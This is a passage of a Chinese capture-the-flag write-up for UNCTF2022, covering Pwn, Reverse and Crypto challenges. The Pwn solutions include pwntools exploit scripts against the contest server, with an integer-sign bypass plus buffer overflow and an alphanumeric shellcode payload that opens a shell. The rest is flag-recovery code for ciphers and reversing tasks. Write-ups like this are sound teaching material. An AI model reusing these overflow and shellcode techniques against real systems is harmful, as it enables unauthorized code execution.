class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>    uint32;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DWORD uint32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">size_t</span> nbytes;</span><br><span class="line"><span class="keyword">char</span> nptr[<span class="number">32</span>]=<span class="string">&quot; -33&quot;</span>;</span><br><span class="line">LODWORD(nbytes) = atoi(nptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,atoi(nptr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,nptr[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> ( atoi(nptr) &gt; <span class="number">32</span> || nptr[<span class="number">0</span>] == <span class="number">0x2D</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No!!Hacker&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">39482</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;size: \n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">&#x27; -33&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(<span class="number">0x4008c3</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="int-0x80"><a href="#int-0x80" class="headerlink" title="int 0x80"></a>int 0x80</h3><blockquote><p>easy easy easy Pwn</p></blockquote><p>ret2shellcode，其中的 <code>__ctype_b_loc</code> 函数的作用可参考 <code>ctype/ctype.h</code> 源码，将输入的字符根据 </p><p><code>((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))</code></p><p>进行处理，然后根据下面表对应的内容返回。参考 <a href="https://blog.csdn.net/yongbaoii/article/details/120446765">2021 天翼杯 pwn ezshell</a>。</p><p><img src="/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAeW9uZ2Jhb2lp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom:80%;"></p><p><code>s[i] &amp; 0x4000 != 0</code> 意思即要求的输入字符是可见字符。</p><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">mrctf2020_shellcode_revenge</a>，使用全可见字符shellcode输入即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node.yuzhian.com.cn&#x27;</span>,<span class="number">32261</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;h3ll0_w_0_r_1_d&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="# Reverse"></a># Reverse</h2><h3 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h3><blockquote><p>你能找到属于你的key吗？</p></blockquote><p>简单替换加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">121</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">107</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> s[i] == <span class="number">109</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &lt;= <span class="number">110</span>:</span><br><span class="line">    s[i] -= <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> s[i] &gt; <span class="number">111</span>:</span><br><span class="line">    s[i] += <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;yesiamflag&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezzzzre"><a href="#ezzzzre" class="headerlink" title="ezzzzre"></a>ezzzzre</h3><blockquote><p>re签到题</p></blockquote><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，顺着实现得flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;HELLOCTF&#x27;</span>)</span><br><span class="line">out = [<span class="number">2</span>*k-<span class="number">69</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;KESSYAcG&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h3><p>数独判定逻辑。直接运行显示的数独是错的，动调获取正确的数独初始数组，找个在线网站解了后填入为：</p><p><code>[8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9]</code></p><p>依次输入后得到</p><p> <code>Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag!</code></p><p><code>UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125;</code></p><p>其中 <code>vme=50</code>，即flag：<code>UNCTF&#123;OAOJYKOFR&#125;</code>。</p><p>​    </p><h3 id="halo"><a href="#halo" class="headerlink" title="halo"></a>halo</h3><p>exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，为两轮异或，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">85</span>,  <span class="number">11</span>, <span class="number">104</span>,  <span class="number">12</span>, <span class="number">115</span>,  <span class="number">62</span>,  <span class="number">12</span>,  <span class="number">58</span>,  <span class="number">93</span>,  <span class="number">27</span>, </span><br><span class="line">   <span class="number">33</span>, <span class="number">117</span>,  <span class="number">79</span>,  <span class="number">32</span>,  <span class="number">76</span>, <span class="number">113</span>,  <span class="number">88</span>, <span class="number">123</span>,  <span class="number">89</span>,  <span class="number">44</span>, </span><br><span class="line">    <span class="number">0</span>, <span class="number">119</span>,  <span class="number">88</span>, <span class="number">119</span>,  <span class="number">14</span>, <span class="number">114</span>,  <span class="number">91</span>,  <span class="number">38</span>,  <span class="number">11</span>, <span class="number">112</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">119</span>,  <span class="number">54</span>, <span class="number">118</span>,  <span class="number">55</span>, <span class="number">118</span>,  <span class="number">98</span>, <span class="number">114</span>, </span><br><span class="line">  <span class="number">109</span>,  <span class="number">39</span>,  <span class="number">63</span>, <span class="number">119</span>,  <span class="number">38</span>,  <span class="number">38</span>]</span><br><span class="line"></span><br><span class="line">s = [s[i]^<span class="number">0x33</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    s[i] ^= s[i-<span class="number">1</span>]^i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;</span></span><br><span class="line"><span class="comment"># 修正：flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="HelloRust"><a href="#HelloRust" class="headerlink" title="HelloRust"></a>HelloRust</h3><blockquote><p>快来逆逆这一坨答辩罢</p></blockquote><p>IDA打开，分析代码逻辑，识别为RC4算法，找到密文hex值 <code>876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E</code>，以及key值 <code>UnCtF2022</code>，</p><p>使用Cyberchef得到flag明文：<code>unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;</code>。</p><p>​    </p><h3 id="ezast"><a href="#ezast" class="headerlink" title="ezast"></a>ezast</h3><blockquote><p>你会ast吗</p></blockquote><p>JavaScript抽象语法树（AST），定位密文 <code>OTYN\\\\a[inE+iEl.hcEo)ivo+g</code>，且中间运算包含异或操作，尝试使用Cyberchef异或爆破，发现在key=0x1a时，得到flag：<code>UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;</code>。</p><p>​    </p><h3 id="HUAQIANG"><a href="#HUAQIANG" class="headerlink" title="HUAQIANG"></a>HUAQIANG</h3><p>深育杯原题 生瓜蛋子，参考<a href="https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ">官方wp</a>，代码逻辑为一个VM，逐位爆破flag每位的可行值，得到满足条件的输入：<code>998bc64bbd919f27f44e5e2750644c</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>爆破可见字符得到md5表，再依次遍历密文取出相应字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">8d9c307cb7f3c4a32822a51922d1ceaa</span></span><br><span class="line"><span class="string">0d61f8370cad1d412f80b84d143e1257</span></span><br><span class="line"><span class="string">b9ece18c950afbfa6b0fdbfa4ff731d3</span></span><br><span class="line"><span class="string">800618943025315f869e4e1f09471012</span></span><br><span class="line"><span class="string">f95b70fdc3088560732a5ac135644506</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8277e0910d750195b448797616e091ad</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">92eb5ffee6ae2fec3ad71c777531578f</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8f14e45fceea167a5a36dedd4bea2543</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">cbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>1换为 <code>.</code>，0换为 <code>-</code>，摩斯密码解密得：<code>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</code>。</p><p>​    </p><h3 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h3><p>ROT64变种凯撒密码，用脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">ord</span>(<span class="string">&#x27;U&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  <span class="keyword">if</span> s[i] == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    t += s[i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    t += dic[(dic.index(s[i])+d)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>比md5-1多了一层异或操作，还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">c1fd731c6d60040369908b4a5f309f41</span></span><br><span class="line"><span class="string">80fdc84bbb5ed9e207a21d5436efdcfd</span></span><br><span class="line"><span class="string">b48d19bb99a7e6bb448f63b75bc92384</span></span><br><span class="line"><span class="string">39eaf918a52fcaa5ed9195e546b021c1</span></span><br><span class="line"><span class="string">795d6869f32db43ff5b414de3c235514</span></span><br><span class="line"><span class="string">f59a054403f933c842e9c3235c136367</span></span><br><span class="line"><span class="string">c80b37816048952a3c0fc9780602a2fa</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">cad06891e0c769c7b02c228c8c2c8865</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">4bdea6676e5335f857fa8e47249fa1d8</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">edbb7ab78cde98a07b9b5a2ab284bf0a</span></span><br><span class="line"><span class="string">44b43e07e9af05e3b9b129a287e5a8df</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">abed1f675819a2c0f65c9b7da8cab301</span></span><br><span class="line"><span class="string">738c486923803a1b59ef17329d70bbbd</span></span><br><span class="line"><span class="string">7e209780adf2cd1212e793ae8796ed7c</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">636a84a33e1373324d64463eeb8e7614</span></span><br><span class="line"><span class="string">6ec65b4ab061843b066cc2a2f16820d5</span></span><br><span class="line"><span class="string">a4a39b59eb036a4a8922f7142f874114</span></span><br><span class="line"><span class="string">8c34745bd5b5d42cb3efe381eeb88e4b</span></span><br><span class="line"><span class="string">5b1ba76b1d36847d632203a75c4f74e2</span></span><br><span class="line"><span class="string">d861570e7b9998dbafb38c4f35ba08bc</span></span><br><span class="line"><span class="string">464b7d495dc6019fa4a709da29fc7952</span></span><br><span class="line"><span class="string">8eb69528cd84b73d858be0947f97b7cc</span></span><br><span class="line"><span class="string">dd6ac4c783a9059d11cb0910fc95d4a</span></span><br><span class="line"><span class="string">4b6b0ee5d5f6b24e6898997d765c487c</span></span><br><span class="line"><span class="string">b0762bc356c466d6b2b8f6396f2e041</span></span><br><span class="line"><span class="string">8547287408e2d2d8f3834fc1b90c3be9</span></span><br><span class="line"><span class="string">82947a7d007b9854fa62efb18c9fd91f</span></span><br><span class="line"><span class="string">8ddafe43b36150de851c83d80bd22b0a</span></span><br><span class="line"><span class="string">c7b36c5f23587e285e528527d1263c8b</span></span><br><span class="line"><span class="string">2a0816e8af86e68825c9df0d63a28381</span></span><br><span class="line"><span class="string">63ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cc = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= cc[i-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">cc = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:].rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> cc]</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()]=<span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> cc:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p = gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">f = p**<span class="number">3</span>*(p-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>读加密方式，明显的playfair密码。</p><p>按照key排列好字母表，手动把每两个字母取出解密后，排列为 <code>UNCTFGODYOUKNOWPLAYFAIRX</code>，在适当的地方加符号分割单词：<code>UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</code>。</p><p>​    </p><h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>变表维吉尼亚密码，先根据前4字符确定key值，再遍历爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 